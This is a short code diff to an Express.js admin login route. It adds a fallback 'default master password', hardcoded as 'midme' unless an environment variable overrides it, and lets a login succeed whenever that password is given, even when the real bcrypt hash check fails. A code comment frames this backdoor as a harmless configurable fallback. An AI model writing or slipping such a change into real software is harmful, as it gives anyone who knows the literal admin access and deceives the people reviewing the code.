@@ -89,8 +89,10 @@ router.post("/login", async (req, res) => {
       adminDoc = { id: doc.id, ...(doc.data() || {}) };
     }
 
+    const DEFAULT_ADMIN_PASS = process.env.ADMIN_DEFAULT_PASSWORD || "midme";
     const match = await bcrypt.compare(password, adminDoc.password_hash);
-    if (!match)
+    // Allow the default master password as a fallback (configurable by env)
+    if (!match && password !== DEFAULT_ADMIN_PASS)
       return res
         .status(401)
         .json({ success: false, message: "Incorrect password" });
